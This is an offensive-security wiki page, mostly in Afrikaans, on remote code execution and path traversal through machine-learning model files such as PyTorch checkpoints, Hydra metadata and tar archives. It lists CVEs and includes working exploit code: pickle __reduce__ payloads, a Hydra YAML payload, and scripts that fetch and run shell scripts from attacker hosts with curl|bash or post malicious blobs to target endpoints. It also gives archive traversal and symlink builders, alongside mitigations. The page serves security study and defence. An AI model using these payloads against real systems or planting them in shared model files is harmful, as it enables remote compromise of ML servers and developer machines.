# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning-modelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan in ontwikkelaars se masjiene of produksiestelsels gelaai word vir gebruik. Gewoonlik behoort modelle nie kwaadwillige kode te bevat nie, maar daar is gevalle waar 'n model gebruik kan word om arbitrêre kode op die stelsel uit te voer — óf as 'n beoogde funksie, óf as gevolg van 'n kwesbaarheid in die model-laadbiblioteek.

Op die tyd van skrywe is hier 'n paar voorbeelde van hierdie tipe kwesbaarhede:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadaardige pickle in model checkpoint lei tot kode-uitvoering (omseil `weights_only`-beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige model-aflaai veroorsaak kode-uitvoering; Java-deserialisering RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige checkpoint-deserialisering via `torch.load` **(CVE-2025-23298)**                                           | Onbetroubare checkpoint aktiveer pickle reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in ML-worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laai van model vanaf YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Laai van model met **Lambda** laag voer arbitrêre Python-kode uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Gemaakte `.tflite` model veroorsaak integer overflow → heap-besmetting (potensiële RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laai van 'n model via `joblib.load` voer pickle uit met die aanvaller se `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *disputed*                                                                              | `numpy.load` standaard laat gepicklede objekarrays toe – kwaadwillige `.npy/.npz` veroorsaak kode-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model se external-weights pad kan uit die gids ontsnap (lees arbitrêre lêers) <br> Kwaadwillige ONNX model tar kan arbitrêre lêers oorskryf (leidend tot RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model met custom operator benodig dat die aanvaller se native code gelaai word; komplekse modelgraphs misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Gebruik van model-load API met `--model-control` aangeskakel laat relatiewe pad-traversal toe om lêers te skryf (bv. oorskryf `.bashrc` vir RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (meerdere heap overflows)                                                                         | Verkeerd gevormde GGUF model-lêer veroorsaak heap buffer overflows in die parser, wat arbitrêre kode-uitvoering op die slagofferstelsel moontlik maak                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Kwaadwillige HDF5 (`.h5`) model met Lambda-laag kode word steeds uitgevoer tydens laai (Keras safe_mode dek nie ou formaat nie – “downgrade attack”) | |
| **Others** (general)        | *Ontwerpgebrek* – Pickle-serialisering                                                                                         | Baie ML-instrumente (bv. pickle-gebaseerde modelformate, Python `pickle.load`) sal arbitrêre kode uitvoer wat in model-lêers ingebed is, tensy dit gemitigeer word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Onbetroubare metadata deurgegee aan `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Aanvallerbeheerde model-metadata/config stel `_target_` na 'n arbitrêre callable (bv. `builtins.exec`) → uitgevoer tydens laai, selfs met “safe” formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Daarbenewens is daar 'n aantal Python-pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat arbitrêre kode op die stelsel kan uitvoer as hulle nie met `weights_only=True` gelaai word nie. Dus kan enige pickle-gebaseerde model spesifiek vatbaar wees vir hierdie tipe aanvalle, selfs al word dit nie in die tabel hierbo genoem nie.

### Hydra metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` importeer en roep enige dotted `_target_` in 'n konfigurasie-/metadata-objek aan. Wanneer biblioteke **onbetroubare model-metadata** in `instantiate()` invoer, kan 'n aanvaller 'n callable en argumente verskaf wat dadelik tydens model-laai uitgevoer word (geen pickle benodig nie).

Payload-voorbeeld (werk in `.nemo` `model_config.yaml`, repo `config.json`, of `__metadata__` binne `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Belangrike punte:
- Word aangeroep voordat die model geïnisialiseer word in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, en FlexTok loaders.
- Hydra se string-bloklys kan omseil word via alternatiewe importpaaie (bv. `enum.bltns.eval`) of toepassing-opgeloste name (bv. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok ontleed ook gestringsifiseerde metadata met `ast.literal_eval`, wat DoS (CPU/memory blowup) moontlik maak voor die Hydra-aanroep.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is 'n gewilde open-source webkoppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-endpoint `/api/v2/models/install` bloot wat gebruikers toelaat om modelle van arbitraire URL's af te laai en te laai.

Intern roep die endpoint uiteindelik:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die aangelewerde lêer 'n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` 'n **pickle deserialization** uit. Omdat die inhoud direk van die gebruiker-beheerde URL kom, kan 'n aanvaller 'n kwaadwillige objek met 'n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word uitgevoer **during deserialization**, wat lei tot **remote code execution (RCE)** op die InvokeAI server.

Die kwesbaarheid is toegeken **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Huisves `payload.ckpt` op 'n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Roep die kwesbare endpoint aan (geen autentisering vereis):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai roep dit `torch.load()` → die `os.system` gadget word uitgevoer en die aanvaller kry kode-uitvoering in die konteks van die InvokeAI-proses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiseer die hele vloei.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` reachable by the attacker  
•  Process has permissions to execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` as verstek en voer malware-scanning uit voor deserialisering.  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Onthou dat **enige** Python pickle-based formaat (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth` files) inherente onveilige is om van onbetroubare bronne te deserialiseer.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via onveilige `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (deel van Merlin) het 'n onveilige checkpoint-loader blootgestel wat direk `torch.load()` op deur die gebruiker verskafde paaie aangeroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan 'n deur 'n aanvaller beheer­de checkpoint tydens deserialisering arbitrêre kode uitvoer via 'n reducer.

Kwetsbare pad (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan 'n objek 'n reducer definieer (`__reduce__`/`__setstate__`) wat 'n callable en argumente teruggee. Die callable word uitgevoer tydens unpickling. As so 'n objek in 'n checkpoint teenwoordig is, word dit uitgevoer voordat enige weights gebruik word.

Minimale kwaadwillige checkpoint-voorbeeld:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Afleervereiers en skadeomvang:
- Trojaniseerde checkpoints/modelle gedeel via repos, buckets, of artifact registries
- Geoutomatiseerde hervat-/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering gebeur binne training-/inference-workers, dikwels met verhoogde voorregte (bv. root in kontainers)

Oplossing: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met 'n beperkte, allow-listed deserialiser geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en voorkom dat arbitrêre callables tydens laai aangeroep word.

Verdedigingsriglyne spesifiek vir PyTorch-checkpoints:
- Moet nie unpickle onbetroubare data nie. Voorkeur vir nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, verseker `weights_only=True` (ondersteun in nuwer PyTorch) of gebruik 'n pasgemaakte allow-listed unpickler soortgelyk aan die Transformers4Rec-patch.
- Handhaaf modelproveniens/handtekeninge en isoleer deserialisering (seccomp/AppArmor; nie-root gebruiker; beperkte FS en geen netwerk egress).
- Monitor vir onverwagte subprosesse van ML-dienste tydens checkpoint-laai; spoor `torch.load()`/`pickle` gebruik.

POC en kwesbare/patch verwysings:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Voorbeeld – skep 'n kwaadwillige PyTorch-model

- Skep die model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel 'n `resnet` endpoint bloot wat deur die gebruiker beheerde data deserializes. ZDI het bevestig dat 'n afgeleë aanvaller 'n slagoffer kan dwing om 'n kwaadwillige bladsy of lêer te laai, dit 'n vervaardigde serialized blob na daardie endpoint kan push, en deserialization as `root` kan trigger, wat tot volledige kompromittering lei.

Die exploit-vloei weerspieël tipiese pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Enige gadget wat bereikbaar is tydens deserialization (constructors, `__setstate__`, framework callbacks, ens.) kan op dieselfde manier misbruik word, ongeag of die vervoer HTTP, WebSocket, of 'n lêer wat in 'n waargeneemde gids gedruppel is.

## Modelle na Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), die meeste model formate wat deur verskillende AI frameworks gebruik word is gebaseer op argiewe, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om path traversal attacks uit te voer, wat toelaat om arbitrêre lêers vanaf die stelsel waar die model gelaai word te lees.

Byvoorbeeld, met die volgende kode kan jy 'n model skep wat 'n lêer in die `/tmp` directory sal skep wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die `/tmp` gids sal maak wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Diepduik: Keras .keras deserialization and gadget hunting

Vir 'n gefokusde gids oor .keras internals, Lambda-layer RCE, die arbitrary import-kwessie in ≤ 3.8, en post-fix gadget-ontdekking binne die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Verwysings

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
